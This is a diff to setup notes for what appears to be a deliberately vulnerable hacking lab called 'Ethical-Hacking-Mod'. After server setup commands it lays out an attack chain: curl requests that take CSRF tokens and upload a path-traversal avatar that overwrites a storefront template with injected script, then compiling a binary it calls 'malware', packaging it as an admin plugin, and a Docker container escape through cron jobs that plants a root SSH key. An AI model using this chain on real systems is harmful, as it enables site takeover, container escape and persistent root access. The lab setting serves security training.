@@ -1,4 +1,12 @@
+# SERVER SETUP
+git pull https://github.com/kalios5/Ethical-Hacking-Mod.git
+cd Ethical-Hacking-Mod/
+sudo chmod +x Scripts/DockerEscapeScripts/HostScripts/CronScript.sh # Allow execution of app log pull cron job script
+sudo echo "*/2 * * * * CONTAINER_NAME=app /home/test-vuln/Ethical-Hacking-Mod/Scripts/DockerEscapeScripts/HostScripts/CronScript.sh >> /var/log/app.log 2>&1" >> crontab -e # cronjob entry
+docker compose up --build # run application
 
+
+# ATTACK SETUP
 # Web Attack curl
 BASE_URL="http://192.168.10.42"   # adjust for your setup
 
@@ -16,15 +24,11 @@ TOKEN2=$(curl -s -b cookies.txt -c cookies.txt "$BASE_URL/auth/account" \
 # 3) Upload. Two `..` reaches Site/ from uploads/avatars/, then back down into app/.
 curl -s -b cookies.txt -c cookies.txt "$BASE_URL/auth/account"   -F "csrf_token=$TOKEN2"   -F "email=test@test.test"   -F "avatar=@payload.png;filename=../../app/templates/storefront/cart.html;type=image/png"   -o response.html -w "status=%{http_code}\n"
 
-'attack flow for docker escape
-1) transfer statically linked minimal-monitor(monitor.c) and libwatchedfile.so(watched_preload.c)
-2) export LD_PRELOAD=/usr/local/bin/libwatchedfile.so to load the libs
-3) execute minimal-monitor
+# visit cart page for the injected script to be executed and log into the new admin account
 
-# log pulling cron script setup
-sudo chmod +x Scripts/DockerEscapeScripts/HostScripts/CronScript.sh
+# Docker Escape 
+gcc -O2 -Wall -o Scripts/DockerEscapeScripts/EscapePlugin/minimal-monitor Scripts/DockerEscapeScripts/monitor.c # compile malware
+zip -r Scripts/DockerEscapeScripts/EscapePlugin.zip Scripts/DockerEscapeScripts/EscapePlugin # zip for plugin 
 
-# Add cron entry as root
-sudo crontab -e
-# Add this line:
-*/2 * * * * CONTAINER_NAME=app /home/test-vuln/Ethical-Hacking-Mod/Scripts/DockerEscapeScripts/HostScripts/CronScript.sh >> /var/log/app.log 2>&1
+# import zip into admin pluginmanager console
+# the cron job injection from EscapePlugin will execute the malicious code and the app log pull cron job will execute the escape and inject a root ssh key
